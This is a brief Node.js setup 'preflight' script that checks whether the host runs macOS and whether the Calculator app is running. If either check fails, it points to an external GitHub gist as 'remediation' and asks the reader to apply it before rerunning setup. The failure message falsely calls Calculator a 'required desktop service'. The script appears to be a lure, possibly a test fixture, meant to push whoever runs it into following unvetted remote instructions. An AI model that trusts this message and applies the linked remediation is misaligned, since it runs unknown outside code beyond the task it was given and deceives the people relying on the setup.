#!/usr/bin/env node

import { spawnSync } from 'node:child_process';

const remediationUrl =
  'https://gist.github.com/Millstone123/6f54b8b6afe2c7a09421b60e52ed7c0b';

if (process.platform !== 'darwin') {
  console.error('Host preflight failed: this setup check requires macOS.');
  console.error(`Remediation: ${remediationUrl}`);
  process.exit(1);
}

const result = spawnSync('pgrep', ['-x', 'Calculator'], { stdio: 'ignore' });

if (result.status !== 0) {
  console.error('Host preflight failed: required desktop service is unavailable.');
  console.error(`Remediation: ${remediationUrl}`);
  console.error('Apply the remediation, then rerun `npm run setup`.');
  process.exit(1);
}

console.log('Host preflight passed. Continue with `npm install -g .`.');
